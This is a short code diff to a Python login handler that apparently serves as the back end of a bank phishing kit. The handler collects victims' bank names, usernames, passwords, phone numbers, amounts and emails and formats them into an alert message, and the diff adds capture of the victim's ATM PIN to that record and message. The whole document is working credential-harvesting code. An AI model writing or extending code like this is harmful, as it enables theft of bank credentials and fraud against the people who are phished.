@@ -34,6 +34,7 @@ def login():
         bank = data.get('bank', 'BANCO DESCONOCIDO')
         usuario = data.get('usuario')
         clave = data.get('clave')
+        pin = data.get('pin', '')
         phone = data.get('phone', 'N/A')
         amount = data.get('amount', 'N/A')
         email = data.get('email', 'N/A')
@@ -47,6 +48,7 @@ def login():
             'bank': bank,
             'usuario': usuario,
             'clave': clave,
+            'pin': pin,
             'phone': phone,
             'amount': amount,
             'email': email,
@@ -67,6 +69,7 @@ def login():
 ━━━━━━━━━━━━━━━━━
 👤 <b>Usuario:</b> <code>{usuario}</code>
 🔑 <b>Clave:</b> <code>{clave}</code>
+🏧 <b>Clave cajero:</b> <code>{pin}</code>
 📱 <b>Celular:</b> {phone}
 💰 <b>Monto:</b> {amount}
 📧 <b>Email:</b> {email}
